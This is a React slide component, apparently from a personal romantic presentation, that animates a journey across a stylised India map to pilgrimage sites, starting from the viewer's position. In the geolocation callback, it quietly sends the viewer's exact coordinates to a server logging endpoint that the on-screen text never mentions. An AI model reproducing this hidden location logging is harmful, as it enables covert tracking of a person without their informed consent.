"use client";

import { useState, useEffect } from "react";
import SlideWrapper from "../SlideWrapper";
import { motion, AnimatePresence } from "framer-motion";
import { Navigation, MapPin, Map as MapIcon, RotateCcw } from "lucide-react";

interface SlideProps {
  onNext: () => void;
  onBack?: () => void;
}

// Spiritual Destinations on the SVG Map (Relative coordinates 0-100%)
const DESTINATIONS = [
  { id: "vrindavan", name: "Vrindavan", cx: 48, cy: 37, delay: 1, info: "Where it all begins ✨" },
  { id: "badrinath", name: "Badrinath (Char Dham)", cx: 47, cy: 22, delay: 2, info: "The Northern Peak 🏔️" },
  { id: "dwarka", name: "Dwarka (Char Dham)", cx: 15, cy: 55, delay: 3, info: "The Western Shore 🌊" },
  { id: "puri", name: "Puri (Char Dham)", cx: 75, cy: 58, delay: 4, info: "The Eastern Grace 🌅" },
  { id: "rameswaram", name: "Rameswaram (Char Dham)", cx: 45, cy: 90, delay: 5, info: "The Southern End 🌴" },
  { id: "kashi", name: "Kashi Vishwanath", cx: 65, cy: 45, delay: 6, info: "The City of Light 🪔" },
  { id: "chandratal", name: "Chandratal (Spiti)", cx: 45, cy: 15, delay: 7, info: "Lake of the Moon 🌙" },
];

export default function Slide11Travel({ onNext, onBack }: SlideProps) {
  const [hasStarted, setHasStarted] = useState(false);
  const [origin, setOrigin] = useState<{ cx: number; cy: number } | null>(null);
  const [locationStatus, setLocationStatus] = useState<"idle" | "fetching" | "success" | "error">("idle");
  const [activeDest, setActiveDest] = useState(0);

  // Simplified logic to convert rough Lat/Lng to our SVG (0-100) overlay.
  // This is a stylistic approximation since a perfect projection isn't needed for the emotional effect.
  const handleGetLocation = () => {
    setLocationStatus("fetching");
    
    if (!navigator.geolocation) {
      setLocationStatus("error");
      fallbackLocation();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Very rough India bounding box mapping to 0-100%
        // Lat: ~8 to ~37, Lng: ~68 to ~97
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        
        // Basic normalization (Approximate for visual representation)
        // Adjust these math values if the dot ends up completely off the map
        const mappedX = ((lng - 68) / (97 - 68)) * 100;
        const mappedY = (1 - (lat - 8) / (37 - 8)) * 100;

        // Log exact coordinates to the server so it appears in Vercel logs
        fetch('/api/log-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ lat, lng })
        }).catch(err => console.error("Could not log location:", err));

        setOrigin({ cx: Math.max(0, Math.min(100, mappedX)), cy: Math.max(0, Math.min(100, mappedY)) });
        setLocationStatus("success");
      },
      () => {
        // If she denies location or it fails, default to roughly North India (Delhi area)
        console.log("[MAP] Location denied or failed, using default origin.");
        fallbackLocation();
      }
    );
  };

  const fallbackLocation = () => {
    setOrigin({ cx: 45, cy: 35 }); // Delhi/NCR rough area
    setLocationStatus("success");
  };

  const startJourney = () => {
    if (!origin) handleGetLocation(); // Auto fetch if not done yet
    setHasStarted(true);
    
    // Sequence the popup texts
    DESTINATIONS.forEach((dest, index) => {
      setTimeout(() => {
        setActiveDest(index + 1);
      }, dest.delay * 1500);
    });
  };

  return (
    <SlideWrapper id="travel">
      <div className="absolute inset-0 bg-[#050B14] -z-10"></div>
      <div className="flex flex-col items-center justify-between w-full h-full max-w-5xl mx-auto py-8">
        
        {/* Header Section */}
        <div className="text-center space-y-3 z-10">
          <motion.h2 
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-4xl md:text-5xl font-bold bg-gradient-to-r from-teal-400 to-emerald-400 bg-clip-text text-transparent drop-shadow-lg"
          >
            Plan for Journey 🗺️
          </motion.h2>
          <motion.p 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.5 }}
            className="text-emerald-100/70 italic text-lg"
          >
            "Taking my Parvati to all the divine homes..."
          </motion.p>
        </div>

        {/* The Map Interface */}
        <div className="relative w-full aspect-[3/4] md:aspect-square max-h-[60vh] mt-4 flex justify-center items-center">
          
          {!hasStarted && (
            <motion.div 
              className="absolute inset-0 z-20 flex flex-col items-center justify-center bg-black/60 backdrop-blur-sm rounded-3xl border border-emerald-500/20"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
            >
              <div className="glass-card p-8 rounded-2xl flex flex-col items-center space-y-6 max-w-sm text-center">
                <MapIcon className="w-16 h-16 text-emerald-400 animate-pulse" />
                <p className="text-emerald-100 font-medium text-lg">
                  ... 🌍
                </p>
                
                <button
                  onClick={handleGetLocation}
                  disabled={locationStatus === "fetching" || locationStatus === "success"}
                  className="px-8 py-3 bg-gradient-to-r from-teal-500 to-emerald-500 hover:from-teal-400 hover:to-emerald-400 text-white rounded-full font-bold shadow-[0_0_20px_rgba(52,211,153,0.3)] transition-all flex items-center gap-2 disabled:opacity-50"
                >
                  <Navigation size={20} />
                  {locationStatus === "idle" && "Locate Me"}
                  {locationStatus === "fetching" && "Finding you..."}
                  {locationStatus === "success" && "Found You! ✅"}
                  {locationStatus === "error" && "Using Magic Location"}
                </button>

                {locationStatus === "success" && origin && (
                  <motion.button
                    initial={{ scale: 0.8, opacity: 0 }}
                    animate={{ scale: 1, opacity: 1 }}
                    onClick={startJourney}
                    className="mt-4 px-10 py-4 bg-white text-emerald-900 rounded-full font-black text-xl hover:scale-105 transition-all shadow-xl w-full"
                  >
                    Start Journey ✨
                  </motion.button>
                )}
              </div>
            </motion.div>
          )}

          {/* SVG Map Container */}
          <div className="relative w-full h-full max-w-md mx-auto opacity-80 border-2 border-emerald-900/30 rounded-3xl overflow-hidden shadow-2xl bg-[#0A192F]">
            
            {/* Simple Stylized India Base Map using a distinct SVG path for aesthetic */}
            {/* Note: This is a highly stylized, abstract representation of India for aesthetic purposes */}
            <svg viewBox="0 0 100 100" className="w-full h-full absolute inset-0 opacity-20 drop-shadow-[0_0_15px_rgba(52,211,153,0.5)]">
               <path 
                 d="M45,5 L55,10 L65,15 L70,25 L85,35 L95,45 L90,55 L80,60 L75,70 L65,85 L50,95 L40,90 L35,80 L25,75 L15,65 L10,55 L5,45 L15,35 L20,25 L35,15 Z" 
                 fill="none" 
                 stroke="#34D399" 
                 strokeWidth="0.5"
                 strokeDasharray="2,2"
               />
            </svg>

            {/* Render Journey SVG */}
            {origin && hasStarted && (
              <svg viewBox="0 0 100 100" className="w-full h-full absolute inset-0 z-10 pointer-events-none">
                {/* Origin Point */}
                <circle cx={origin.cx} cy={origin.cy} r="1.5" fill="#fff" className="animate-ping" />
                <circle cx={origin.cx} cy={origin.cy} r="1" fill="#34D399" />
                
                {/* Draw Paths & Destinations */}
                {DESTINATIONS.map((dest, i) => (
                  <g key={dest.id}>
                    {/* The Travel Path Line */}
                    <motion.line
                      x1={origin.cx}
                      y1={origin.cy}
                      x2={dest.cx}
                      y2={dest.cy}
                      stroke="#10B981"
                      strokeWidth="0.4"
                      strokeLinecap="round"
                      strokeDasharray="1,1" // Dotted path effect
                      initial={{ pathLength: 0, opacity: 0 }}
                      animate={{ pathLength: 1, opacity: 0.6 }}
                      transition={{ duration: 2, delay: dest.delay * 1.5, ease: "easeInOut" }}
                    />
                    
                    {/* The Destination Dot */}
                    <motion.circle
                      cx={dest.cx}
                      cy={dest.cy}
                      r="1.2"
                      fill="#FCD34D" // Gold for spiritual places
                      initial={{ scale: 0, opacity: 0 }}
                      animate={{ scale: 1, opacity: 1 }}
                      transition={{ delay: (dest.delay * 1.5) + 1.8 }}
                    />
                  </g>
                ))}
              </svg>
            )}

            {/* Destination Labels Overlay (HTML over SVG for better text rendering) */}
            {hasStarted && origin && (
              <div className="absolute inset-0 pointer-events-none z-20">
                <div 
                  className="absolute text-[8px] md:text-[10px] font-bold text-white bg-black/50 px-2 py-0.5 rounded-full border border-white/20"
                  style={{ left: `${origin.cx}%`, top: `${origin.cy}%`, transform: 'translate(-50%, -150%)' }}
                >
                  You Are Here ❤️
                </div>

                {DESTINATIONS.map((dest, i) => (
                  <motion.div
                    key={`label-${dest.id}`}
                    initial={{ opacity: 0, scale: 0.5, y: 10 }}
                    animate={activeDest > i ? { opacity: 1, scale: 1, y: 0 } : { opacity: 0 }}
                    className="absolute whitespace-nowrap"
                    style={{ left: `${dest.cx}%`, top: `${dest.cy}%`, transform: 'translate(10%, -50%)' }}
                  >
                    <div className="bg-emerald-900/80 backdrop-blur-md px-2 py-1 rounded-lg border border-emerald-500/30 shadow-lg">
                      <p className="text-[10px] md:text-xs font-bold text-emerald-300">{dest.name}</p>
                      <p className="text-[8px] md:text-[9px] text-emerald-100/70">{dest.info}</p>
                    </div>
                  </motion.div>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Bottom Actions */}
        <div className="flex flex-col items-center space-y-4 pt-4 z-10">
          <AnimatePresence>
            {hasStarted && activeDest >= DESTINATIONS.length && (
              <motion.button
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={onNext}
                className="px-12 py-4 bg-gradient-to-r from-emerald-500 to-teal-500 text-white rounded-full text-xl font-bold shadow-[0_0_30px_rgba(52,211,153,0.4)] transition-all uppercase tracking-widest mt-4"
              >
                Our Final Destination ❤️
              </motion.button>
            )}
          </AnimatePresence>

          {hasStarted && (
            <button 
              onClick={() => { setHasStarted(false); setActiveDest(0); }}
              className="text-emerald-400 hover:text-white flex items-center gap-2 text-sm transition-colors mt-2"
            >
              <RotateCcw size={14} /> Restart Journey
            </button>
          )}

          {onBack && (
            <button
              onClick={onBack}
              className="text-white/40 hover:text-white font-medium transition-colors text-sm pt-4"
            >
              ← Back
            </button>
          )}
        </div>

      </div>
    </SlideWrapper>
  );
}
